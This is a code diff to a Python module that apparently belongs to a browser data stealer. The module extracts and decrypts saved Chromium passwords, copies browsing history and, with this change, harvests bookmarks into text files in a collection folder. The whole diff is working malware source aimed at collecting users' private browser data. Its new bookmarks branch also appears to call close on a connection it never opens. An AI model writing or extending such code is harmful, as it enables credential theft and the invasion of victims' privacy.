@@ -56,6 +56,34 @@ class Chromium:
         except:
             return "Can't decode"
 
+    def _bookmarks_reader(self, json_object):
+
+        temp = []
+
+        def read(json_object, temp):
+
+            if isinstance(json_object, dict):
+
+                for key, value in json_object.items():
+
+                    if isinstance(value, (dict, list)):
+                        read(value, temp)
+
+                    elif key == "name":
+                        temp.append([value])
+
+                    elif key == "url":
+                        temp[-1].append(value)
+
+            elif isinstance(json_object, list):
+
+                for item in json_object:
+                    read(item, temp)
+
+            return temp
+
+        return [item for item in read(json_object, temp) if len(item) >= 2]
+
     def _write_passwords(self, *args):
 
         passwords_list = args[1].execute(self.config.PasswordsSQL).fetchall()
@@ -146,6 +174,26 @@ class Chromium:
 
         history.close()
 
+    def _write_bookmarks(self, *args):
+
+        with open(args[1], "r", encoding="utf-8") as bookmarks:
+
+            bookmarks_list = self._bookmarks_reader(loads(bookmarks.read()))
+
+        bookmarks.close()
+
+        if len(bookmarks_list) < 1:
+            return
+
+        with open(rf"{self.storage_path}\Browsers\{self.browser_name}\{args[0]} Bookmarks.txt", "a", encoding="utf-8") as bookmarks:
+
+            for result in bookmarks_list:
+
+                item = f"Title: {result[0]}\nUrl: {result[1]}\n\n"
+                bookmarks.write(item)
+
+        bookmarks.close()
+
     def _get_browser_paths(self, profile):
         return (
             {
@@ -179,6 +227,14 @@ class Chromium:
                 "alt_path": None,
                 "method": self._write_history,
                 "error": "No history found"
+            },
+            {
+                "status": self.statuses[4],
+                "name": "Bookmarks",
+                "path": rf"{profile}\Bookmarks",
+                "alt_path": None,
+                "method": self._write_bookmarks,
+                "error": "No bookmarks found"
             }
         )
 
@@ -208,10 +264,14 @@ class Chromium:
                             print(f"[{self.browser_name}]: {item['error']}")
                         return
 
-                    with connect(db) as connection:
-                        connection.text_factory = lambda text: text.decode(errors="ignore")
-                        item["method"](profile.replace("\\", "/").split("/")[-1], connection.cursor(), self._get_key())
-                        connection.cursor().close()
+                    if item["name"] in ["Bookmarks"]:
+                        item["method"](profile.replace("\\", "/").split("/")[-1], item["path"])
+
+                    else:
+                        with connect(db) as connection:
+                            connection.text_factory = lambda text: text.decode(errors="ignore")
+                            item["method"](profile.replace("\\", "/").split("/")[-1], connection.cursor(), self._get_key())
+                            connection.cursor().close()
 
                     connection.close()
                     remove(db)
